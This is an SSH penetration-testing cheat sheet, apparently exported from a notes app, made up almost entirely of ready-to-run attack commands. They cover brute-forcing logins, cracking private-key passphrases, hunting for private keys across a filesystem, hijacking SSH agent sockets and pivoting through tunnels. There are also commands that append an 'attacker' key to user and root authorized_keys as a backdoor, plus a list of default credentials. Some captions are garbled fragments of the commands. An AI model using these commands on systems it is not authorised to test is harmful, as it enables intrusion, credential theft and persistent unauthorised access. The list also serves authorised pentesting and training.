---
id: "es3lpq8uqmpsiwjr2"
title: "ssh"
description: ""
tags: []
order: "2"
createdAt: "2026-05-30T15:46:13.118Z"
updatedAt: "2026-05-30T15:46:22.370Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"c2d7ptn4cmpsiwqj5","order":0,"collapsed":false} -->

### q7bw0ln96mpsiwql4
```bash
nmap -sV -sC -p 22 $TARGET
```

_Port Discovery & Scanning_

**Tags:** ssh, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"q7bw0ln96mpsiwql4","language":"bash","sectionId":"c2d7ptn4cmpsiwqj5","tags":["ssh","nmap","rustscan","recon","discovery"]} -->

### hbfat7hjsmpsiwql8
```bash
nmap -p 22 --script ssh-auth-methods,ssh-brute,ssh-hostkey,ssh2-enum-algos $TARGET
```

**Tags:** ssh, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"hbfat7hjsmpsiwql8","language":"bash","sectionId":"c2d7ptn4cmpsiwqj5","tags":["ssh","nmap","rustscan","recon","discovery"]} -->

### 4kbl2ssyympsiwqlc
```bash
rustscan -a $TARGET -p 22 -- -sV --script ssh-hostkey,ssh-auth-methods
```

**Tags:** ssh, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"4kbl2ssyympsiwqlc","language":"bash","sectionId":"c2d7ptn4cmpsiwqj5","tags":["ssh","nmap","rustscan","recon","discovery"]} -->

## Version & Algorithm Enumeration
<!-- section: {"id":"g7purh52hmpsiwqjb","order":1,"collapsed":false} -->

### yus2m7717mpsiwqlp
```bash
nmap --script ssh2-enum-algos -p 22 $TARGET
```

_Version & Algorithm Enumeration_

**Tags:** ssh, enumeration, algorithms, version, recon
<!-- cmd: {"id":"yus2m7717mpsiwqlp","language":"bash","sectionId":"g7purh52hmpsiwqjb","tags":["ssh","enumeration","algorithms","version","recon"]} -->

### ar7qva67vmpsiwqlt
```bash
ssh -vvv $USER@$TARGET 2>&1 | head -50
```

**Tags:** ssh, enumeration, algorithms, version, recon
<!-- cmd: {"id":"ar7qva67vmpsiwqlt","language":"bash","sectionId":"g7purh52hmpsiwqjb","tags":["ssh","enumeration","algorithms","version","recon"]} -->

### 25ykz2vjxmpsiwqlx
```bash
ssh-audit $TARGET
```

**Tags:** ssh, enumeration, algorithms, version, recon
<!-- cmd: {"id":"25ykz2vjxmpsiwqlx","language":"bash","sectionId":"g7purh52hmpsiwqjb","tags":["ssh","enumeration","algorithms","version","recon"]} -->

### gche9mtylmpsiwqm1
```bash
ssh-audit $TARGET -p 22 --level info
```

**Tags:** ssh, enumeration, algorithms, version, recon
<!-- cmd: {"id":"gche9mtylmpsiwqm1","language":"bash","sectionId":"g7purh52hmpsiwqjb","tags":["ssh","enumeration","algorithms","version","recon"]} -->

## Brute Force Credentials
<!-- section: {"id":"6vycztk8impsiwqjf","order":2,"collapsed":false} -->

### jxcuno6mtmpsiwqmd
```bash
hydra -L users.txt -P passwords.txt ssh://$TARGET -t 4 -f
```

_Brute Force Credentials_

**Tags:** ssh, bruteforce, hydra, medusa, credentials
<!-- cmd: {"id":"jxcuno6mtmpsiwqmd","language":"bash","sectionId":"6vycztk8impsiwqjf","tags":["ssh","bruteforce","hydra","medusa","credentials"]} -->

### rtvck87o4mpsiwqmi
```bash
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ssh://$TARGET
```

**Tags:** ssh, bruteforce, hydra, medusa, credentials
<!-- cmd: {"id":"rtvck87o4mpsiwqmi","language":"bash","sectionId":"6vycztk8impsiwqjf","tags":["ssh","bruteforce","hydra","medusa","credentials"]} -->

### rlvhddchdmpsiwqmm
```bash
medusa -h $TARGET -U users.txt -P passwords.txt -M ssh -t 4
```

**Tags:** ssh, bruteforce, hydra, medusa, credentials
<!-- cmd: {"id":"rlvhddchdmpsiwqmm","language":"bash","sectionId":"6vycztk8impsiwqjf","tags":["ssh","bruteforce","hydra","medusa","credentials"]} -->

### hqt9tuuswmpsiwqmr
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET
```

**Tags:** ssh, bruteforce, hydra, medusa, credentials
<!-- cmd: {"id":"hqt9tuuswmpsiwqmr","language":"bash","sectionId":"6vycztk8impsiwqjf","tags":["ssh","bruteforce","hydra","medusa","credentials"]} -->

### u01w3neb9mpsiwqmu
```bash
patator ssh_login host=$TARGET user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
```

**Tags:** ssh, bruteforce, hydra, medusa, credentials
<!-- cmd: {"id":"u01w3neb9mpsiwqmu","language":"bash","sectionId":"6vycztk8impsiwqjf","tags":["ssh","bruteforce","hydra","medusa","credentials"]} -->

## Key-Based Authentication
<!-- section: {"id":"lsgat5yxgmpsiwqjj","order":3,"collapsed":false} -->

### kzqxasohlmpsiwqn7
```bash
ssh -i id_rsa $USER@$TARGET
```

_Key-Based Authentication_

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"kzqxasohlmpsiwqn7","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### zcs9jy121mpsiwqnb
```bash
ssh -i id_rsa -o StrictHostKeyChecking=no $USER@$TARGET
```

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"zcs9jy121mpsiwqnb","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### eslrvjxypmpsiwqnf
```bash
ssh-keygen -t rsa -b 4096 -f ./pentest_key -N ""
```

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"eslrvjxypmpsiwqnf","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### v8xpcljcbmpsiwqnj
```bash
echo "$(cat pentest_key.pub)" >> /home/$USER/.ssh/authorized_keys
```

_key.pub)" >> /home/$USER/.ssh/authorized_

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"v8xpcljcbmpsiwqnj","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### ouk8ytcikmpsiwqno
```bash
ssh-keygen -y -f id_rsa
```

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"ouk8ytcikmpsiwqno","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### thiwpsebimpsiwqnr
```bash
ssh2john id_rsa > id_rsa.hash
```

_rsa > id_

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"thiwpsebimpsiwqnr","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### y9a4wmg6empsiwqnw
```bash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"y9a4wmg6empsiwqnw","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

### wni2sv3rtmpsiwqo1
```bash
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
```

**Tags:** ssh, key-auth, private-key, credential-access
<!-- cmd: {"id":"wni2sv3rtmpsiwqo1","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->

## Sensitive Key File Locations
<!-- section: {"id":"6mmg2941bmpsiwqjo","order":4,"collapsed":false} -->

### dcqlrs31xmpsiwqog
```bash
find / -name "id_rsa" 2>/dev/null
```

_Sensitive Key File Locations_

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"dcqlrs31xmpsiwqog","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### 54tjv03y7mpsiwqol
```bash
find / -name "id_ecdsa" 2>/dev/null
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"54tjv03y7mpsiwqol","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### 7yaooiwg8mpsiwqoo
```bash
find / -name "*.pem" 2>/dev/null
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"7yaooiwg8mpsiwqoo","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### ms0rcr32qmpsiwqou
```bash
find / -name "authorized_keys" 2>/dev/null
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"ms0rcr32qmpsiwqou","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### 6neqsepmympsiwqox
```bash
cat ~/.ssh/known_hosts
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"6neqsepmympsiwqox","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### 14brsdehampsiwqp1
```bash
cat ~/.ssh/config
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"14brsdehampsiwqp1","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### j9aqhzqs5mpsiwqp5
```bash
dir /s /b C:\Users\*id_rsa* 2>nul
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"j9aqhzqs5mpsiwqp5","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

### 5xxmo87wxmpsiwqpa
```bash
dir /s /b C:\Users\*.pem 2>nul
```

**Tags:** ssh, private-key, loot, post-exploitation, credential-access
<!-- cmd: {"id":"5xxmo87wxmpsiwqpa","language":"bash","sectionId":"6mmg2941bmpsiwqjo","tags":["ssh","private-key","loot","post-exploitation","credential-access"]} -->

## SSH Tunneling & Port Forwarding
<!-- section: {"id":"p0fvy3u1wmpsiwqjr","order":5,"collapsed":false} -->

### 8jgitdr8dmpsiwqpp
```bash
ssh -L 8080:$INTERNAL_HOST:80 $USER@$TARGET -N -f
```

_SSH Tunneling & Port Forwarding_

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"8jgitdr8dmpsiwqpp","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

### rrase7ufhmpsiwqpt
```bash
ssh -R 4444:localhost:4444 $USER@$TARGET -N -f
```

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"rrase7ufhmpsiwqpt","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

### h59z2ws0cmpsiwqpx
```bash
ssh -D 1080 $USER@$TARGET -N -f
```

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"h59z2ws0cmpsiwqpx","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

### 9sblnxvrimpsiwqq0
```bash
proxychains nmap -sT $INTERNAL_HOST
```

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"9sblnxvrimpsiwqq0","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

### ugqg8se6kmpsiwqq5
```bash
ssh -J $USER@$JUMPHOST $USER@$INTERNAL_TARGET
```

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"ugqg8se6kmpsiwqq5","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

### 53ax2uoffmpsiwqq9
```bash
ssh -o ProxyCommand="ssh -W %h:%p $USER@$JUMPHOST" $USER@$INTERNAL_TARGET
```

**Tags:** ssh, tunneling, port-forward, pivot, lateral-movement, socks
<!-- cmd: {"id":"53ax2uoffmpsiwqq9","language":"bash","sectionId":"p0fvy3u1wmpsiwqjr","tags":["ssh","tunneling","port-forward","pivot","lateral-movement","socks"]} -->

## SSH Agent Hijacking
<!-- section: {"id":"303dk9p1zmpsiwqjw","order":6,"collapsed":false} -->

### isllevmaompsiwqql
```bash
find /tmp -name "agent.*" 2>/dev/null
```

_SSH Agent Hijacking_

**Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"isllevmaompsiwqql","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->

### ol1gcoafumpsiwqqo
```bash
ls -la /tmp/ssh-*/
```

**Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"ol1gcoafumpsiwqqo","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->

### 91wy5156hmpsiwqqs
```bash
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l
```

_AUTH_

**Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"91wy5156hmpsiwqqs","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->

### r9doy6504mpsiwqqw
```bash
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh $USER@$TARGET
```

_AUTH_

**Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
<!-- cmd: {"id":"r9doy6504mpsiwqqw","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->

## SSH Config File Abuse
<!-- section: {"id":"mngxuzn8vmpsiwqjz","order":7,"collapsed":false} -->

### awlwc7z1zmpsiwqri
```bash
cat ~/.ssh/config
```

_SSH Config File Abuse_

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"awlwc7z1zmpsiwqri","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

### qsbyqhua1mpsiwqrm
```bash
cat /etc/ssh/ssh_config
```

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"qsbyqhua1mpsiwqrm","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

### n1rrajn49mpsiwqrr
```bash
cat ~/.ssh/known_hosts
```

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"n1rrajn49mpsiwqrr","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

### v0zol86e8mpsiwqrv
```bash
cat /etc/ssh/ssh_known_hosts
```

_known_

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"v0zol86e8mpsiwqrv","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

### 05zvmxrt1mpsiwqrz
```bash
for u in $(ls /home); do cat /home/$u/.ssh/known_hosts 2>/dev/null; done
```

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"05zvmxrt1mpsiwqrz","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

### ug5yug09nmpsiwqs3
```bash
for u in $(ls /home); do cat /home/$u/.ssh/config 2>/dev/null; done
```

**Tags:** ssh, config, known-hosts, recon, lateral-movement
<!-- cmd: {"id":"ug5yug09nmpsiwqs3","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->

## Persistence via SSH Keys
<!-- section: {"id":"qt7l0bpg4mpsiwqk3","order":8,"collapsed":false} -->

### q0x6inqiempsiwqsc
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
```

_Persistence via SSH Keys_

**Tags:** ssh, persistence, authorized-keys, backdoor
<!-- cmd: {"id":"q0x6inqiempsiwqsc","language":"bash","sectionId":"qt7l0bpg4mpsiwqk3","tags":["ssh","persistence","authorized-keys","backdoor"]} -->

### mbqrb11wtmpsiwqsg
```bash
echo "ssh-rsa AAAAB3... attacker" >> ~/.ssh/authorized_keys
```

**Tags:** ssh, persistence, authorized-keys, backdoor
<!-- cmd: {"id":"mbqrb11wtmpsiwqsg","language":"bash","sectionId":"qt7l0bpg4mpsiwqk3","tags":["ssh","persistence","authorized-keys","backdoor"]} -->

### xf2abo594mpsiwqsk
```bash
chmod 600 ~/.ssh/authorized_keys
```

**Tags:** ssh, persistence, authorized-keys, backdoor
<!-- cmd: {"id":"xf2abo594mpsiwqsk","language":"bash","sectionId":"qt7l0bpg4mpsiwqk3","tags":["ssh","persistence","authorized-keys","backdoor"]} -->

### jmwmn372ampsiwqso
```bash
echo "ssh-rsa AAAAB3... attacker" >> /root/.ssh/authorized_keys
```

**Tags:** ssh, persistence, authorized-keys, backdoor
<!-- cmd: {"id":"jmwmn372ampsiwqso","language":"bash","sectionId":"qt7l0bpg4mpsiwqk3","tags":["ssh","persistence","authorized-keys","backdoor"]} -->

## SSHD Configuration Weaknesses
<!-- section: {"id":"b1udb2jtwmpsiwqk7","order":9,"collapsed":false} -->

### q2ulhdo8cmpsiwqsx
```bash
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords|AuthorizedKeysFile|AllowUsers|X11Forwarding"
```

_SSHD Configuration Weaknesses_

**Tags:** ssh, misconfiguration, sshd, config-review
<!-- cmd: {"id":"q2ulhdo8cmpsiwqsx","language":"bash","sectionId":"b1udb2jtwmpsiwqk7","tags":["ssh","misconfiguration","sshd","config-review"]} -->

### zq8pa026qmpsiwqt1
```bash
PermitRootLogin yes
```

**Tags:** ssh, misconfiguration, sshd, config-review
<!-- cmd: {"id":"zq8pa026qmpsiwqt1","language":"bash","sectionId":"b1udb2jtwmpsiwqk7","tags":["ssh","misconfiguration","sshd","config-review"]} -->

### ktxo1xxtvmpsiwqt6
```bash
PasswordAuthentication yes
```

**Tags:** ssh, misconfiguration, sshd, config-review
<!-- cmd: {"id":"ktxo1xxtvmpsiwqt6","language":"bash","sectionId":"b1udb2jtwmpsiwqk7","tags":["ssh","misconfiguration","sshd","config-review"]} -->

### rgo38oxjbmpsiwqt9
```bash
PermitEmptyPasswords yes
```

**Tags:** ssh, misconfiguration, sshd, config-review
<!-- cmd: {"id":"rgo38oxjbmpsiwqt9","language":"bash","sectionId":"b1udb2jtwmpsiwqk7","tags":["ssh","misconfiguration","sshd","config-review"]} -->

### fwpn8fsx0mpsiwqtd
```bash
X11Forwarding yes
```

**Tags:** ssh, misconfiguration, sshd, config-review
<!-- cmd: {"id":"fwpn8fsx0mpsiwqtd","language":"bash","sectionId":"b1udb2jtwmpsiwqk7","tags":["ssh","misconfiguration","sshd","config-review"]} -->

## Username Enumeration (CVE-2018-15473)
<!-- section: {"id":"9y5bbzvnrmpsiwqkb","order":10,"collapsed":false} -->

### assdbuat3mpsiwqtu
```bash
python3 ssh_user_enum.py --userList users.txt --ip $TARGET
```

_user_

**Tags:** ssh, user-enumeration, cve, unauthenticated
<!-- cmd: {"id":"assdbuat3mpsiwqtu","language":"bash","sectionId":"9y5bbzvnrmpsiwqkb","tags":["ssh","user-enumeration","cve","unauthenticated"]} -->

### 9z49fkv8rmpsiwqty
```bash
use auxiliary/scanner/ssh/ssh_enumusers (metasploit)
```

**Tags:** ssh, user-enumeration, cve, unauthenticated
<!-- cmd: {"id":"9z49fkv8rmpsiwqty","language":"bash","sectionId":"9y5bbzvnrmpsiwqkb","tags":["ssh","user-enumeration","cve","unauthenticated"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"juk2es338mpsiwqkf","order":11,"collapsed":false} -->

### 5lqjaczw5mpsiwqu8
```bash
nmap -p 22 --script "ssh-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** ssh, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"5lqjaczw5mpsiwqu8","language":"bash","sectionId":"juk2es338mpsiwqkf","tags":["ssh","nmap","nse","vulnerability-scan"]} -->

### du00dqbh8mpsiwquc
```bash
nmap -p 22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos,ssh-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET
```

**Tags:** ssh, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"du00dqbh8mpsiwquc","language":"bash","sectionId":"juk2es338mpsiwqkf","tags":["ssh","nmap","nse","vulnerability-scan"]} -->

## Common Misconfigurations
<!-- section: {"id":"6rxdbl8rompsiwqki","order":12,"collapsed":false} -->

### 7ii3kvg6vmpsiwquo
```bash
ssh root@$TARGET
```

_Common Misconfigurations_

**Tags:** ssh, misconfiguration, root-login, weak-keys
<!-- cmd: {"id":"7ii3kvg6vmpsiwquo","language":"bash","sectionId":"6rxdbl8rompsiwqki","tags":["ssh","misconfiguration","root-login","weak-keys"]} -->

### 10zwkndp0mpsiwqus
```bash
grep "PasswordAuthentication" /etc/ssh/sshd_config
```

**Tags:** ssh, misconfiguration, root-login, weak-keys
<!-- cmd: {"id":"10zwkndp0mpsiwqus","language":"bash","sectionId":"6rxdbl8rompsiwqki","tags":["ssh","misconfiguration","root-login","weak-keys"]} -->

### xduw622avmpsiwquw
```bash
ssh -o BatchMode=yes -o PasswordAuthentication=yes $USER@$TARGET
```

**Tags:** ssh, misconfiguration, root-login, weak-keys
<!-- cmd: {"id":"xduw622avmpsiwquw","language":"bash","sectionId":"6rxdbl8rompsiwqki","tags":["ssh","misconfiguration","root-login","weak-keys"]} -->

### fj6mscl9ampsiwqv0
```bash
ssh-audit $TARGET | grep -i weak
```

**Tags:** ssh, misconfiguration, root-login, weak-keys
<!-- cmd: {"id":"fj6mscl9ampsiwqv0","language":"bash","sectionId":"6rxdbl8rompsiwqki","tags":["ssh","misconfiguration","root-login","weak-keys"]} -->

### h8akw1jxhmpsiwqv4
```bash
nmap -p- --min-rate 5000 $TARGET | grep open
```

**Tags:** ssh, misconfiguration, root-login, weak-keys
<!-- cmd: {"id":"h8akw1jxhmpsiwqv4","language":"bash","sectionId":"6rxdbl8rompsiwqki","tags":["ssh","misconfiguration","root-login","weak-keys"]} -->

## Default Credentials
<!-- section: {"id":"9ieii4jkempsiwqkm","order":13,"collapsed":false} -->

### unvy8lajmmpsiwqvf
```bash
root:root
```

_Default Credentials_

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"unvy8lajmmpsiwqvf","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### bt9dvl2fvmpsiwqvi
```bash
root:toor
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"bt9dvl2fvmpsiwqvi","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### tn2x5waakmpsiwqvn
```bash
admin:admin
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"tn2x5waakmpsiwqvn","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### synq8v93empsiwqvq
```bash
admin:password
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"synq8v93empsiwqvq","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### tkzptef0jmpsiwqvv
```bash
pi:raspberry (Raspberry Pi)
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"tkzptef0jmpsiwqvv","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### 7qkyjw2snmpsiwqvz
```bash
ubuntu:ubuntu
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"7qkyjw2snmpsiwqvz","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->

### ghbr9vvjrmpsiwqw2
```bash
vagrant:vagrant
```

**Tags:** ssh, default-credentials, bruteforce
<!-- cmd: {"id":"ghbr9vvjrmpsiwqw2","language":"bash","sectionId":"9ieii4jkempsiwqkm","tags":["ssh","default-credentials","bruteforce"]} -->
